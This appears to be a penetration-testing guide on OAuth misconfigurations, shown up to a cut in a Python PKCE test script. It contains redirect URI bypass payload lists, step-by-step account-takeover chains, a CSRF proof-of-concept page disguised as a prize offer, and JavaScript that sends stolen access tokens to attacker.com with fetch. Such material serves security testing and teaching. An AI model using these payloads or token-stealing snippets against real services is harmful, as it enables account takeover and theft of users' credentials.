---
title: OAuth Misconfiguration
description: Complete guide to OAuth authentication vulnerabilities, redirect URI manipulation, token theft, state parameter abuse, scope escalation, and account takeover through misconfigured OAuth flows.
navigation:
  icon: i-lucide-key-round
  title: OAuth Misconfiguration
---

## What is OAuth

OAuth 2.0 is an **authorization framework** that allows third-party applications to obtain limited access to user accounts on an HTTP service. Instead of sharing credentials directly, users grant access tokens through a consent flow. Misconfigurations in this flow lead to **token theft, account takeover, privilege escalation**, and unauthorized data access.

::note
OAuth misconfigurations consistently rank among the **highest-paid bug bounty findings**. A single redirect URI bypass can lead to full account takeover on platforms with millions of users. Payouts regularly reach **$5,000–$50,000+** on major programs.
::

::card-group
  ::card
  ---
  title: Redirect URI Manipulation
  icon: i-lucide-external-link
  ---
  Bypass redirect URI validation to steal authorization codes or access tokens. Open redirects, path traversal, subdomain tricks, and parameter pollution redirect tokens to **attacker-controlled endpoints**.
  ::

  ::card
  ---
  title: State Parameter Abuse
  icon: i-lucide-shield-alert
  ---
  Missing or weak `state` parameter enables **CSRF-based account linking**. Attacker forces victim to link their account to attacker's OAuth identity, achieving persistent access.
  ::

  ::card
  ---
  title: Token Leakage
  icon: i-lucide-droplets
  ---
  Access tokens and authorization codes leak through **Referer headers, browser history, URL fragments, logs, and error messages**. Implicit flow is especially vulnerable.
  ::

  ::card
  ---
  title: Scope Escalation
  icon: i-lucide-arrow-up-right
  ---
  Request additional OAuth scopes beyond what the application is authorized for. Gain access to **private repos, emails, admin APIs**, or full account control.
  ::

  ::card
  ---
  title: Client Secret Exposure
  icon: i-lucide-lock-open
  ---
  Client secrets hardcoded in **mobile apps, JavaScript, public repos, or decompiled binaries**. With the client secret, attacker can impersonate the application entirely.
  ::

  ::card
  ---
  title: Account Takeover
  icon: i-lucide-skull
  ---
  Chain OAuth flaws to achieve **full account takeover**: steal tokens, link attacker accounts, bypass email verification, or hijack existing sessions.
  ::
::

---

## OAuth 2.0 Flows Overview

Understanding OAuth flows is **essential** before testing. Each flow has different attack surfaces and vulnerability patterns.

::tabs
  :::tabs-item{icon="i-lucide-git-branch" label="Authorization Code Flow"}
  ```txt [Flow Diagram]
  ┌──────┐                              ┌──────────┐                        ┌──────────┐
  │ User │                              │  Client  │                        │ Auth     │
  │      │                              │  App     │                        │ Server   │
  └──┬───┘                              └────┬─────┘                        └────┬─────┘
     │                                       │                                   │
     │  1. Click "Login with Provider"       │                                   │
     │──────────────────────────────────────>│                                   │
     │                                       │                                   │
     │  2. Redirect to Authorization URL     │                                   │
     │<──────────────────────────────────────│                                   │
     │                                       │                                   │
     │  GET /authorize?                      │                                   │
     │    response_type=code&                │                                   │
     │    client_id=CLIENT_ID&               │                                   │
     │    redirect_uri=CALLBACK&             │                                   │
     │    scope=openid+email&                │                                   │
     │    state=RANDOM_STATE                 │                                   │
     │──────────────────────────────────────────────────────────────────────────>│
     │                                       │                                   │
     │  3. User authenticates & consents     │                                   │
     │<─────────────────────────────────────────────────────────────────────────│
     │                                       │                                   │
     │  4. Redirect to callback with code    │                                   │
     │    GET /callback?code=AUTH_CODE&state=RANDOM_STATE                        │
     │──────────────────────────────────────>│                                   │
     │                                       │                                   │
     │                                       │  5. Exchange code for token       │
     │                                       │  POST /token                      │
     │                                       │    grant_type=authorization_code&  │
     │                                       │    code=AUTH_CODE&                 │
     │                                       │    client_id=CLIENT_ID&            │
     │                                       │    client_secret=SECRET&           │
     │                                       │    redirect_uri=CALLBACK           │
     │                                       │──────────────────────────────────>│
     │                                       │                                   │
     │                                       │  6. Return access_token           │
     │                                       │<──────────────────────────────────│
     │                                       │                                   │
     │  7. Authenticated session created     │                                   │
     │<──────────────────────────────────────│                                   │

  ATTACK SURFACE:
  - redirect_uri manipulation (step 2 & 4)
  - state parameter CSRF (step 2 & 4)
  - Authorization code interception (step 4)
  - Code reuse / no expiry (step 5)
  - Client secret exposure (step 5)
  ```
  :::

  :::tabs-item{icon="i-lucide-git-branch" label="Implicit Flow"}
  ```txt [Flow Diagram]
  ┌──────┐                              ┌──────────┐                        ┌──────────┐
  │ User │                              │  Client  │                        │ Auth     │
  │      │                              │  (SPA)   │                        │ Server   │
  └──┬───┘                              └────┬─────┘                        └────┬─────┘
     │                                       │                                   │
     │  1. Click "Login with Provider"       │                                   │
     │──────────────────────────────────────>│                                   │
     │                                       │                                   │
     │  2. Redirect to Authorization URL     │                                   │
     │    GET /authorize?                    │                                   │
     │      response_type=token&             │                                   │
     │      client_id=CLIENT_ID&             │                                   │
     │      redirect_uri=CALLBACK&           │                                   │
     │      scope=openid+email               │                                   │
     │──────────────────────────────────────────────────────────────────────────>│
     │                                       │                                   │
     │  3. User authenticates & consents     │                                   │
     │                                       │                                   │
     │  4. Redirect with token in FRAGMENT   │                                   │
     │    GET /callback#access_token=TOKEN&token_type=bearer                    │
     │<─────────────────────────────────────────────────────────────────────────│
     │──────────────────────────────────────>│                                   │
     │                                       │                                   │
     │  5. JavaScript reads token from URL fragment                              │
     │                                       │                                   │

  ATTACK SURFACE:
  - Token in URL fragment (visible in browser, Referer, logs)
  - No code exchange (token directly exposed)
  - redirect_uri manipulation (step 2 & 4)
  - Token interception via open redirect
  - XSS on callback page steals token from fragment
  - NO state parameter protection (common)
  
  ⚠️ Implicit flow is DEPRECATED in OAuth 2.1
     Still widely used in legacy SPAs
  ```
  :::

  :::tabs-item{icon="i-lucide-git-branch" label="Client Credentials Flow"}
  ```txt [Flow Diagram]
  ┌──────────┐                        ┌──────────┐
  │  Client  │                        │ Auth     │
  │  App     │                        │ Server   │
  └────┬─────┘                        └────┬─────┘
       │                                   │
       │  POST /token                      │
       │    grant_type=client_credentials& │
       │    client_id=CLIENT_ID&           │
       │    client_secret=SECRET&          │
       │    scope=requested_scope          │
       │──────────────────────────────────>│
       │                                   │
       │  Return access_token              │
       │<──────────────────────────────────│

  ATTACK SURFACE:
  - Client secret exposure
  - Overly broad scopes
  - No user context (machine-to-machine)
  - If secret is leaked → full API access
  ```
  :::

  :::tabs-item{icon="i-lucide-git-branch" label="PKCE Flow"}
  ```txt [Flow Diagram]
  # PKCE (Proof Key for Code Exchange)
  # Prevents authorization code interception attacks
  # Required for public clients (mobile apps, SPAs)

  1. Client generates:
     code_verifier = RANDOM_STRING (43-128 chars)
     code_challenge = BASE64URL(SHA256(code_verifier))

  2. Authorization request includes:
     GET /authorize?
       response_type=code&
       client_id=CLIENT_ID&
       redirect_uri=CALLBACK&
       code_challenge=CHALLENGE&
       code_challenge_method=S256&
       state=RANDOM

  3. Token exchange includes:
     POST /token
       grant_type=authorization_code&
       code=AUTH_CODE&
       client_id=CLIENT_ID&
       redirect_uri=CALLBACK&
       code_verifier=VERIFIER

  4. Server verifies:
     BASE64URL(SHA256(code_verifier)) == stored code_challenge

  ATTACK SURFACE:
  - PKCE downgrade (remove code_challenge, server doesn't enforce)
  - code_challenge_method=plain (no hashing)
  - Weak code_verifier generation
  - PKCE not required by server
  ```
  :::
::

---

## Redirect URI Manipulation

The **#1 OAuth vulnerability**. The `redirect_uri` parameter tells the authorization server where to send the authorization code or token after user consent. If validation is weak, the attacker redirects tokens to their own server.

::caution
A successful redirect URI bypass is a **direct path to account takeover**. The attacker receives the victim's authorization code or access token, which can be exchanged for full account access.
::

### Open Redirect on Whitelisted Domain

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Finding Open Redirects"}
  ```txt [Payloads]
  # If redirect_uri must match *.target.com
  # Find an open redirect ANYWHERE on target.com
  # Chain: OAuth redirect → Open redirect → Attacker server

  # Step 1: Find open redirect on target.com
  # Common redirect parameters to test:
  https://target.com/redirect?url=https://attacker.com
  https://target.com/redirect?next=https://attacker.com
  https://target.com/redirect?return=https://attacker.com
  https://target.com/redirect?returnTo=https://attacker.com
  https://target.com/redirect?go=https://attacker.com
  https://target.com/redirect?dest=https://attacker.com
  https://target.com/redirect?destination=https://attacker.com
  https://target.com/redirect?redir=https://attacker.com
  https://target.com/redirect?redirect_url=https://attacker.com
  https://target.com/redirect?target=https://attacker.com
  https://target.com/redirect?view=https://attacker.com
  https://target.com/redirect?continue=https://attacker.com
  https://target.com/redirect?forward=https://attacker.com
  https://target.com/login?next=https://attacker.com
  https://target.com/logout?redirect=https://attacker.com
  https://target.com/out?url=https://attacker.com
  https://target.com/away?to=https://attacker.com
  https://target.com/cgi-bin/redirect.cgi?url=https://attacker.com
  https://target.com/link?url=https://attacker.com

  # Step 2: Use open redirect as redirect_uri
  https://auth.provider.com/authorize?
    response_type=code&
    client_id=CLIENT_ID&
    redirect_uri=https://target.com/redirect?url=https://attacker.com&
    scope=openid+email&
    state=RANDOM

  # Result: auth code sent to target.com/redirect
  #         which redirects to attacker.com?code=AUTH_CODE
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Open Redirect Payloads"}
  ```txt [Payloads]
  # Common open redirect bypass payloads to test on target.com:

  # Basic:
  https://attacker.com
  //attacker.com
  \/\/attacker.com
  /\attacker.com
  
  # Protocol-relative:
  //attacker.com
  ///attacker.com
  ////attacker.com
  
  # Backslash:
  /\/attacker.com
  \/attacker.com
  
  # URL encoding:
  https%3A%2F%2Fattacker.com
  %2F%2Fattacker.com
  %252F%252Fattacker.com
  
  # @ trick:
  https://target.com@attacker.com
  https://target.com%40attacker.com
  
  # Null byte:
  https://attacker.com%00.target.com
  https://attacker.com%0d%0a.target.com
  
  # Tab / newline:
  https://attacker%09.com
  https://attacker%0a.com
  https://attacker%0d.com
  
  # Fragment:
  https://target.com#@attacker.com
  https://target.com#https://attacker.com
  
  # Subdomain confusion:
  https://target.com.attacker.com
  https://targetcom.attacker.com
  https://attacker.com/target.com
  
  # Data URI:
  data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9hdHRhY2tlci5jb20nPC9zY3JpcHQ+
  
  # JavaScript URI:
  javascript:location='https://attacker.com'
  ```
  :::
::

### Direct Redirect URI Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Path Manipulation"}
  ```txt [Payloads]
  # Whitelisted: https://target.com/callback
  # Try these variations:

  # Subdirectory traversal:
  redirect_uri=https://target.com/callback/../redirect?url=https://attacker.com
  redirect_uri=https://target.com/callback/..%2fredirect?url=https://attacker.com
  redirect_uri=https://target.com/callback/../../other-path
  redirect_uri=https://target.com/callback%2f..%2f..%2fredirect
  
  # Path addition:
  redirect_uri=https://target.com/callback?next=https://attacker.com
  redirect_uri=https://target.com/callback#https://attacker.com
  redirect_uri=https://target.com/callback/.attacker.com
  redirect_uri=https://target.com/callback/attacker.com
  redirect_uri=https://target.com/callback%23@attacker.com
  redirect_uri=https://target.com/callback?@attacker.com
  
  # Directory addition:
  redirect_uri=https://target.com/callbackextra
  redirect_uri=https://target.com/callback/extra/path
  redirect_uri=https://target.com/callback/anything
  redirect_uri=https://target.com/callback;attacker.com
  
  # Port variation:
  redirect_uri=https://target.com:443/callback
  redirect_uri=https://target.com:80/callback
  redirect_uri=https://target.com:8443/callback
  redirect_uri=https://target.com:8080/callback
  
  # Scheme variation:
  redirect_uri=http://target.com/callback     (HTTP instead of HTTPS)
  redirect_uri=HTTP://target.com/callback
  redirect_uri=hTtPs://target.com/callback
  
  # Trailing characters:
  redirect_uri=https://target.com/callback/
  redirect_uri=https://target.com/callback//
  redirect_uri=https://target.com/callback/.
  redirect_uri=https://target.com/callback/..
  redirect_uri=https://target.com/callback%00
  redirect_uri=https://target.com/callback%20
  redirect_uri=https://target.com/callback%0d%0a
  redirect_uri=https://target.com/callback%23
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Domain Manipulation"}
  ```txt [Payloads]
  # Whitelisted domain: target.com
  # Try these domain variations:

  # Subdomain:
  redirect_uri=https://anything.target.com/callback
  redirect_uri=https://evil.target.com/callback
  redirect_uri=https://attacker.target.com/callback
  redirect_uri=https://dev.target.com/callback
  redirect_uri=https://staging.target.com/callback
  
  # If subdomain wildcard allowed + subdomain takeover:
  # Take over unused subdomain → receive tokens there
  
  # Domain confusion:
  redirect_uri=https://target.com.attacker.com/callback
  redirect_uri=https://targett.com/callback           (typosquat)
  redirect_uri=https://targetcom.com/callback
  redirect_uri=https://target-com.com/callback
  redirect_uri=https://target.com-attacker.com/callback
  
  # @ in URL:
  redirect_uri=https://target.com@attacker.com/callback
  redirect_uri=https://target.com%40attacker.com/callback
  
  # Backslash:
  redirect_uri=https://target.com\@attacker.com/callback
  redirect_uri=https://target.com\.attacker.com/callback
  
  # Null byte:
  redirect_uri=https://attacker.com%00.target.com/callback
  redirect_uri=https://attacker.com%00target.com/callback
  
  # Case variation:
  redirect_uri=https://TARGET.COM/callback
  redirect_uri=https://Target.Com/callback
  redirect_uri=https://tArGeT.cOm/callback
  
  # IP address:
  redirect_uri=https://93.184.216.34/callback  (target.com's IP)
  redirect_uri=https://127.0.0.1/callback
  redirect_uri=https://0x5DB8D822/callback     (hex IP)
  redirect_uri=https://[::1]/callback           (IPv6 localhost)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Fragment & Parameter"}
  ```txt [Payloads]
  # Fragment-based token theft:
  # Implicit flow: token is in URL fragment (#access_token=...)
  # Fragments are NOT sent to server in HTTP requests
  # BUT JavaScript can read them
  
  # If callback page has ANY JavaScript that redirects:
  redirect_uri=https://target.com/callback
  # After redirect: https://target.com/callback#access_token=TOKEN
  # If page redirects to another URL, fragment may be preserved
  
  # Parameter injection:
  redirect_uri=https://target.com/callback?redirect=https://attacker.com
  redirect_uri=https://target.com/callback?next=https://attacker.com
  redirect_uri=https://target.com/callback?url=https://attacker.com
  redirect_uri=https://target.com/callback?return_to=https://attacker.com
  
  # Multiple redirect_uri parameters:
  redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
  
  # URL-encoded redirect_uri:
  redirect_uri=https%3A%2F%2Ftarget.com%2Fcallback
  redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback
  
  # Double-encoded:
  redirect_uri=https%253A%252F%252Fattacker.com%252Fcallback
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Localhost & Special URIs"}
  ```txt [Payloads]
  # Mobile app / desktop app redirect URIs
  # These custom schemes are often poorly validated

  # Custom schemes:
  redirect_uri=myapp://callback
  redirect_uri=com.target.app://callback
  redirect_uri=com.target.app:/callback
  redirect_uri=target://callback
  redirect_uri=target-app://callback

  # Localhost (desktop app flows):
  redirect_uri=http://localhost/callback
  redirect_uri=http://localhost:8080/callback
  redirect_uri=http://127.0.0.1/callback
  redirect_uri=http://127.0.0.1:ATTACKER_PORT/callback
  redirect_uri=http://[::1]/callback
  redirect_uri=http://0.0.0.0/callback
  redirect_uri=http://0/callback

  # Attacker can listen on localhost:ATTACKER_PORT
  # to capture codes when victim runs local exploit

  # urn:ietf:wg:oauth:2.0:oob (out-of-band):
  redirect_uri=urn:ietf:wg:oauth:2.0:oob
  # Code displayed in browser title/body
  # Attacker can read via social engineering or XSS

  # Out-of-band variations:
  redirect_uri=urn:ietf:wg:oauth:2.0:oob:auto
  redirect_uri=oob
  ```
  :::
::

### Redirect URI Exploitation

```txt [Complete Attack Flow]
═══════════════════════════════════════════════════
  REDIRECT URI BYPASS → ACCOUNT TAKEOVER
═══════════════════════════════════════════════════

STEP 1: Discover valid client_id and redirect_uri
        - Inspect OAuth login flow in browser dev tools
        - Check page source for OAuth configuration
        - Monitor network requests during "Login with Google/GitHub"

STEP 2: Find redirect_uri bypass
        - Try path traversal, subdomain variations
        - Find open redirect on target domain
        - Check if wildcard subdomains are allowed

STEP 3: Craft malicious authorization URL
        https://accounts.google.com/o/oauth2/auth?
          response_type=code&
          client_id=LEGITIMATE_CLIENT_ID&
          redirect_uri=https://target.com/redirect?url=https://attacker.com/steal&
          scope=openid+email+profile&
          state=RANDOM

STEP 4: Send link to victim (phishing, social engineering)
        - Victim clicks link
        - Victim sees legitimate Google login page
        - Victim authenticates and grants consent

STEP 5: Victim redirected through chain:
        1. Google → https://target.com/redirect?url=https://attacker.com/steal&code=AUTH_CODE
        2. target.com → https://attacker.com/steal?code=AUTH_CODE
        3. Attacker captures AUTH_CODE

STEP 6: Exchange code for token:
        POST https://oauth2.googleapis.com/token
          grant_type=authorization_code&
          code=STOLEN_AUTH_CODE&
          client_id=LEGITIMATE_CLIENT_ID&
          client_secret=STOLEN_OR_PUBLIC_SECRET&
          redirect_uri=https://target.com/redirect?url=https://attacker.com/steal

STEP 7: Use access token to access victim's account
        GET https://www.googleapis.com/oauth2/v1/userinfo
        Authorization: Bearer STOLEN_ACCESS_TOKEN

        → Full access to victim's email, profile, and any granted scopes

═══════════════════════════════════════════════════
```

---

## State Parameter Abuse (CSRF)

The `state` parameter prevents **Cross-Site Request Forgery** in OAuth flows. Missing or predictable state parameters allow attackers to **force-link their OAuth identity to a victim's account**.

::warning
Missing state parameter is one of the most common OAuth vulnerabilities. It enables account takeover by linking the attacker's social account to the victim's application account.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Missing State Parameter"}
  ```txt [Attack Flow]
  # CSRF Account Linking Attack
  # No state parameter = No CSRF protection

  STEP 1: Attacker starts OAuth flow on target app
          → Clicks "Link Google Account"
          → Redirected to Google login

  STEP 2: Attacker authenticates with THEIR OWN Google account
          → Google redirects back with authorization code:
          https://target.com/callback?code=ATTACKER_AUTH_CODE

  STEP 3: Attacker INTERCEPTS the callback (doesn't follow redirect)
          → Captures the URL: https://target.com/callback?code=ATTACKER_AUTH_CODE

  STEP 4: Attacker sends this URL to VICTIM
          → Via CSRF (hidden iframe, image tag, link)

  <img src="https://target.com/callback?code=ATTACKER_AUTH_CODE" style="display:none">

  STEP 5: Victim's browser loads the URL
          → Target app links ATTACKER's Google account to VICTIM's session
          → Attacker's Google account is now linked to victim's app account

  STEP 6: Attacker logs in using "Login with Google"
          → Uses their OWN Google account
          → Target app finds linked account → logs in as VICTIM

  IMPACT: Full Account Takeover
          Attacker can login as victim anytime using their own OAuth credentials
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="CSRF PoC Page"}
  ```html [csrf_oauth.html]
  <!DOCTYPE html>
  <html>
  <head><title>Win a Prize!</title></head>
  <body>
    <h1>Congratulations! Click below to claim your prize!</h1>
    
    <!-- Hidden iframe loads the OAuth callback with attacker's code -->
    <iframe src="https://target.com/callback?code=ATTACKER_AUTH_CODE" 
            style="display:none" width="0" height="0"></iframe>
    
    <!-- Alternative: Image tag (simpler, GET request) -->
    <img src="https://target.com/callback?code=ATTACKER_AUTH_CODE" 
         style="display:none">
    
    <!-- Alternative: Auto-submitting form (POST request) -->
    <form id="csrf" method="POST" action="https://target.com/api/oauth/callback">
      <input type="hidden" name="code" value="ATTACKER_AUTH_CODE">
      <input type="hidden" name="provider" value="google">
    </form>
    <script>document.getElementById('csrf').submit();</script>
    
    <!-- Alternative: JavaScript redirect -->
    <script>
      // Load in background, then redirect to innocent page
      var img = new Image();
      img.src = "https://target.com/callback?code=ATTACKER_AUTH_CODE";
      setTimeout(function() {
        window.location = "https://target.com/";
      }, 2000);
    </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Weak State Validation"}
  ```txt [Payloads]
  # Even when state is present, it may be poorly validated

  # Empty state:
  state=
  state=%00
  state=null
  state=undefined

  # Remove state parameter entirely:
  # Original: /authorize?...&state=abc123
  # Modified: /authorize?...  (no state)

  # Predictable state:
  state=1
  state=123
  state=test
  state=state
  state=csrf
  state=12345
  state=random
  state=0
  state=true

  # State from different session:
  # Capture state from attacker's session
  # Use it in victim's flow (no binding to session)

  # Static state (same for all users):
  # If state never changes across sessions → no CSRF protection

  # State not validated on callback:
  # Send callback WITHOUT state parameter
  # Or with wrong state value
  # If accepted → state is not validated

  # Test:
  # 1. Start OAuth flow → note state value
  # 2. Complete flow with DIFFERENT state → if succeeds, no validation
  # 3. Complete flow WITHOUT state → if succeeds, state not required
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="State Parameter Fixation"}
  ```txt [Attack Flow]
  # If state is generated client-side and attacker can set it:

  STEP 1: Attacker crafts authorization URL with THEIR state:
          https://auth.provider.com/authorize?
            response_type=code&
            client_id=CLIENT_ID&
            redirect_uri=https://target.com/callback&
            state=ATTACKER_CHOSEN_STATE&
            scope=openid+email

  STEP 2: Send to victim

  STEP 3: Victim authenticates → redirected to:
          https://target.com/callback?code=VICTIM_CODE&state=ATTACKER_CHOSEN_STATE

  STEP 4: If application validates state against cookie/session:
          → Attacker pre-sets the cookie via another vulnerability (XSS, CSRF)
          → Application accepts the flow

  # Combined with session fixation:
  # If attacker can set victim's session cookie
  # AND state is derived from session
  # → State validation passes with attacker-controlled state
  ```
  :::
::

---

## Token Leakage

OAuth tokens and authorization codes can leak through multiple channels.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Referer Header Leak"}
  ```txt [Attack Flow]
  # Authorization code leaks via HTTP Referer header

  SCENARIO:
  1. User completes OAuth flow
  2. Redirected to: https://target.com/callback?code=AUTH_CODE
  3. Callback page contains external resources:
     - <img src="https://analytics.external.com/pixel.gif">
     - <script src="https://cdn.external.com/script.js">
     - <link href="https://fonts.googleapis.com/css?family=...">
  4. Browser sends Referer header with these requests:
     Referer: https://target.com/callback?code=AUTH_CODE
  5. External server logs contain the authorization code!

  EXPLOITATION:
  - If attacker controls ANY external resource on callback page → code leaked
  - If callback page has user-controllable links → code in Referer when clicked
  - If callback page loads third-party analytics → code in their logs

  CHECK:
  # Load the callback page and inspect external requests in dev tools:
  # Network tab → Check all requests for Referer headers containing "code="
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Browser History & Logs"}
  ```txt [Leak Vectors]
  # Authorization code in URL = visible in many places

  1. BROWSER HISTORY
     - code= visible in browser address bar
     - Saved in browser history
     - Accessible via history.back() / history API
     - Synced across devices (Chrome sync)

  2. SERVER LOGS
     - Web server access logs contain full URL
     - GET /callback?code=AUTH_CODE logged
     - Proxy logs (corporate proxies)
     - CDN logs
     - WAF logs

  3. BROWSER EXTENSIONS
     - Extensions can read URLs
     - Malicious extensions capture OAuth codes
     - Analytics extensions log URLs

  4. COPY/PASTE
     - User copies URL to share
     - URL with code pasted in chat/email

  5. SHOULDER SURFING
     - Code visible in URL bar

  6. SHARED COMPUTER
     - Next user sees code in history/address bar

  # IMPLICIT FLOW - WORSE:
  # Token in URL fragment: #access_token=TOKEN
  # Fragment preserved in some redirects
  # Accessible via JavaScript on any page
  # Service workers can intercept fragments
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Implicit Flow Token Theft"}
  ```txt [Payloads]
  # Implicit flow returns token directly in URL fragment
  # Much more dangerous than authorization code flow

  # Token in fragment:
  https://target.com/callback#access_token=TOKEN&token_type=bearer&expires_in=3600

  # Attack 1: XSS on callback page
  # If ANY XSS exists on callback page:
  <script>
    var hash = window.location.hash;
    var token = hash.match(/access_token=([^&]+)/)[1];
    fetch('https://attacker.com/steal?token=' + token);
  </script>

  # Attack 2: Open redirect + fragment preservation
  # Some browsers/servers preserve fragments across redirects
  # redirect_uri=https://target.com/redirect?url=https://attacker.com
  # → https://attacker.com#access_token=TOKEN
  # Attacker's page reads fragment with JavaScript

  # Attack 3: Service Worker interception
  # If attacker can register service worker on target origin
  # Service worker can intercept navigation including fragments

  # Attack 4: PostMessage interception
  # If callback page uses postMessage to send token to parent:
  window.addEventListener('message', function(e) {
    fetch('https://attacker.com/steal?data=' + JSON.stringify(e.data));
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token in API Response"}
  ```txt [Where to Look]
  # Check ALL API responses for leaked tokens

  # User profile endpoint:
  GET /api/user/me
  Response: {
    "id": 123,
    "email": "user@example.com",
    "oauth_token": "LEAKED_ACCESS_TOKEN",     # ← LEAK!
    "refresh_token": "LEAKED_REFRESH_TOKEN"   # ← LEAK!
  }

  # Settings/connections endpoint:
  GET /api/user/connected-accounts
  Response: {
    "google": {
      "access_token": "ya29.LEAKED_TOKEN",    # ← LEAK!
      "email": "user@gmail.com"
    }
  }

  # Debug/error responses:
  GET /api/oauth/status
  Response: {
    "debug": true,
    "token": "LEAKED_TOKEN",                  # ← LEAK!
    "client_secret": "LEAKED_SECRET"          # ← LEAK!
  }

  # In HTML source:
  <meta name="oauth-token" content="LEAKED_TOKEN">
  <script>var token = "LEAKED_TOKEN";</script>
  <input type="hidden" name="access_token" value="LEAKED_TOKEN">

  # In error messages:
  "Invalid token: ya29.a0AfH6SMB..."         # ← Partial token leak!
  ```
  :::
::

---

## Authorization Code Flaws

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Code Reuse"}
  ```txt [Attack Flow]
  # Test if authorization code can be used multiple times

  STEP 1: Complete normal OAuth flow
          → Receive code=AUTH_CODE

  STEP 2: Exchange code for token (normal):
          POST /token
          grant_type=authorization_code&code=AUTH_CODE&...
          → Receive access_token (success)

  STEP 3: Try exchanging SAME code again:
          POST /token
          grant_type=authorization_code&code=AUTH_CODE&...
          → If success → CODE REUSE VULNERABILITY

  # Impact:
  # If code leaks (Referer, logs, etc.)
  # AND code can be reused
  # → Attacker gets a valid token from leaked code
  
  # OAuth spec (RFC 6749 Section 4.1.2):
  # "The authorization code MUST expire shortly after it is issued"
  # "The authorization code MUST NOT be used more than once"
  # If used again, server SHOULD revoke all tokens from that code
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Code Not Bound to Client"}
  ```txt [Attack Flow]
  # Test if code is bound to the specific client_id

  STEP 1: Legitimate app (client_id=APP_A) starts OAuth flow
  STEP 2: User authorizes → code=AUTH_CODE issued for APP_A
  
  STEP 3: Attacker intercepts AUTH_CODE

  STEP 4: Attacker uses their OWN app (client_id=APP_B):
          POST /token
          grant_type=authorization_code&
          code=AUTH_CODE&           (stolen from APP_A)
          client_id=APP_B&          (attacker's app)
          client_secret=APP_B_SECRET&
          redirect_uri=https://attacker.com/callback

  STEP 5: If token is issued → code is NOT bound to client
          → Any registered OAuth app can exchange any code

  # Impact: Code theft from one app can be used by another
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Code Not Bound to redirect_uri"}
  ```txt [Attack Flow]
  # Test if code exchange validates redirect_uri

  STEP 1: Start OAuth flow with:
          redirect_uri=https://target.com/callback

  STEP 2: Receive code at callback

  STEP 3: Exchange code with DIFFERENT redirect_uri:
          POST /token
          grant_type=authorization_code&
          code=AUTH_CODE&
          client_id=CLIENT_ID&
          client_secret=SECRET&
          redirect_uri=https://attacker.com/callback  # DIFFERENT!

  STEP 4: If token is issued → redirect_uri not validated on exchange
          
  # Impact: Allows redirect_uri bypass even with strict validation
  # on the authorization endpoint
  
  # Combined attack:
  # Use ANY redirect_uri bypass to get code
  # Then exchange with the original redirect_uri
  # OR exchange without redirect_uri at all:
  POST /token
  grant_type=authorization_code&
  code=AUTH_CODE&
  client_id=CLIENT_ID&
  client_secret=SECRET
  # (no redirect_uri parameter)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Long-Lived Codes"}
  ```txt [Attack Flow]
  # Test authorization code expiration

  STEP 1: Get authorization code at time T
  STEP 2: Wait 1 minute → exchange code → works?
  STEP 3: Wait 5 minutes → exchange code → works?
  STEP 4: Wait 30 minutes → exchange code → works?
  STEP 5: Wait 1 hour → exchange code → works?
  STEP 6: Wait 24 hours → exchange code → works?

  # OAuth spec: code SHOULD expire within 10 minutes
  # Best practice: 30-60 seconds

  # If code valid for hours:
  # → Leaked codes in logs/Referer remain exploitable
  # → Greatly increases attack window
  ```
  :::
::

---

## PKCE Bypass

PKCE (Proof Key for Code Exchange) prevents authorization code interception. However, it can be **downgraded or bypassed** if not properly enforced.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="PKCE Downgrade"}
  ```txt [Payloads]
  # Test if server enforces PKCE when client sends code_challenge

  # Normal request WITH PKCE:
  GET /authorize?
    response_type=code&
    client_id=CLIENT_ID&
    redirect_uri=CALLBACK&
    code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&
    code_challenge_method=S256&
    scope=openid

  # Try WITHOUT code_challenge (PKCE removed):
  GET /authorize?
    response_type=code&
    client_id=CLIENT_ID&
    redirect_uri=CALLBACK&
    scope=openid

  # If authorization succeeds without code_challenge:
  # → PKCE is OPTIONAL → can be removed by attacker
  # → Authorization code interception attack is possible

  # Exchange without code_verifier:
  POST /token
    grant_type=authorization_code&
    code=AUTH_CODE&
    client_id=CLIENT_ID&
    redirect_uri=CALLBACK
    # No code_verifier!

  # If token is issued → PKCE bypass confirmed
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Plain Challenge Method"}
  ```txt [Payloads]
  # S256 (SHA256) is secure, but "plain" method is not

  # Test if server accepts plain method:
  GET /authorize?
    response_type=code&
    client_id=CLIENT_ID&
    redirect_uri=CALLBACK&
    code_challenge=MY_VERIFIER_STRING&
    code_challenge_method=plain&      # ← PLAIN instead of S256!
    scope=openid

  # With plain method:
  # code_challenge = code_verifier (no hashing)
  # If attacker intercepts the authorization request
  # They can read code_challenge (= code_verifier)
  # And use it to exchange the code

  # Test downgrade from S256 to plain:
  # Original: code_challenge_method=S256
  # Modified: code_challenge_method=plain
  # Send code_challenge as the raw verifier string

  # Also try:
  code_challenge_method=PLAIN
  code_challenge_method=Plain
  code_challenge_method=
  code_challenge_method=none
  # (remove code_challenge_method entirely)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PKCE Verification Script"}
  ```python [test_pkce.py]
  #!/usr/bin/env python3
  """
  Test PKCE enforcement on OAuth authorization server
  """
  import requests
  import hashlib
  import base64
  import os
  import secrets

  AUTH_URL = "https://auth.provider.com/authorize"
  TOKEN_URL = "https://auth.provider.com/token"
  CLIENT_ID = "your_client_id"
  REDIRECT_URI = "https://target.com/callback"

